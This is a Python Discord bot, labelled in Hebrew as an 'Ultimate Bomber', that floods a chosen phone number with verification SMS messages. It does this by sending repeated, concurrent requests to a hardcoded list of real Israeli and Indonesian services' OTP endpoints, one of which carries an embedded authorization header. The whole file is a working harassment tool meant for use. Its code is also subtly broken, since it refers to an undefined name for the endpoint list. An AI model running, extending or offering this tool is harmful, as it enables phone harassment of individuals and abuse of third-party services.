import discord
from discord.ext import commands
import aiohttp
import asyncio
import os
import random

# ==================== CONFIG ====================
TOKEN = os.getenv("BOT_TOKEN")
intents = discord.Intents.default()
intents.message_content = True 

# ==================== FULL API LIST FROM FILE ====================
ALL_APIS = [
    # APIs ישראליים (מהשיחות הקודמות)
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": "{{phone}}", "type": "phone", "projectId": "1"}},
    {"name": "Ivory", "url": "https://www.ivory.co.il/mobile/sms_auth", "method": "POST", "data": {"phone": "{{phone}}"}},
    {"name": "Mishloha", "url": "https://www.mishloha.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # APIs מהקובץ החדש (Matahari, Shopee, Klikwa...)
    {"name": "Matahari", "url": "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", "method": "POST", "json": {"otp_request": {"mobile_number": "{{phone}}", "mobile_country_code": "+62"}}},
    {"name": "KlikIndomaret", "url": "https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={{phone}}", "method": "GET"},
    {"name": "Shopee", "url": "https://shopee.co.id/api/v4/otp/send_vcode", "method": "POST", "json": {"phone": "{{phone}}", "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1,2,3]}},
    {"name": "Ruparupa", "url": "https://wapi.ruparupa.com/auth/generate-otp", "method": "POST", "json": {"phone": "{{phone}}", "action": "register", "channel": "message"}},
    {"name": "Payfazz", "url": "https://api.payfazz.com/v2/phoneVerifications", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Klikwa", "url": "https://api.klikwa.net/v1/number/sendotp", "method": "POST", "headers": {"Authorization": "Basic QjMzOkZSMzM="}, "json": {"phone": "{{phone}}"}},
    {"name": "Asani", "url": "https://api.asani.co.id/api/v1/send-otp", "method": "POST", "json": {"phone": "62{{phone_no_zero}}", "email": f"user{random.randint(1,999)}@gmail.com"}},
    {"name": "Redbus", "url": "https://m.redbus.id/api/getOtp?number={{phone}}", "method": "GET"},
    {"name": "Ktbs", "url": "https://core.ktbs.io/v2/user/registration/otp/{{phone}}", "method": "GET"},
    {"name": "Jumpstart", "url": "https://api.jumpstart.id/graphql", "method": "POST", "json": {"operationName": "CheckPhoneNoAndGenerateOtpIfNotExist", "variables": {"phoneNo": "{{phone}}"}, "query": "mutation CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) { checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo) }"}}
]

active_bombs = {}

# ==================== ENGINE ====================
async def run_attack(session, api, phone, user_id):
    if active_bombs.get(user_id) is False: return
    
    no_zero = phone[1:] if phone.startswith('0') else phone
    url = api["url"].replace("{{phone}}", phone).replace("{{phone_no_zero}}", no_zero)
    
    # החלפת ערכים ב-JSON
    def fix_payload(obj):
        if isinstance(obj, dict): return {k: fix_payload(v) for k, v in obj.items()}
        if isinstance(obj, str): return obj.replace("{{phone}}", phone).replace("{{phone_no_zero}}", no_zero)
        return obj

    payload = fix_payload(api.get("json"))
    data = fix_payload(api.get("data"))
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json"
    }
    if api.get("headers"):
        headers.update(api["headers"])

    try:
        async with session.request(api["method"], url, json=payload, data=data, headers=headers, timeout=8) as r:
            print(f"[{api['name']}] Status: {r.status}")
    except:
        pass

# ==================== DISCORD UI ====================
class BomberModal(discord.ui.Modal, title='🔥 Ultimate Bomber'):
    phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX')
    rounds = discord.ui.TextInput(label='כמות סבבים', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        target = self.phone.value
        user_id = interaction.user.id
        active_bombs[user_id] = True
        await interaction.response.send_message(f"🚀 תקיפה משולבת (ישראל + עולם) החלה על {target}!", ephemeral=True)
        
        async with aiohttp.ClientSession() as session:
            for _ in range(int(self.rounds.value)):
                if active_bombs.get(user_id) is False: break
                tasks = [run_attack(session, api, target, user_id) for api in ALL_APIs]
                await asyncio.gather(*tasks)
                await asyncio.sleep(2)
        
        active_bombs.pop(user_id, None)

class ControlView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="🚀 הפעל", style=discord.ButtonStyle.danger)
    async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BomberModal())
    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_bombs[interaction.user.id] = False
        await interaction.response.send_message("נעצר.", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self): super().__init__(command_prefix='!', intents=intents)
    async def setup_hook(self): await self.tree.sync()

bot = MyBot()

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    await interaction.response.send_message("לוח בקרה - כל ה-APIs בפנים", view=ControlView())

bot.run(TOKEN)
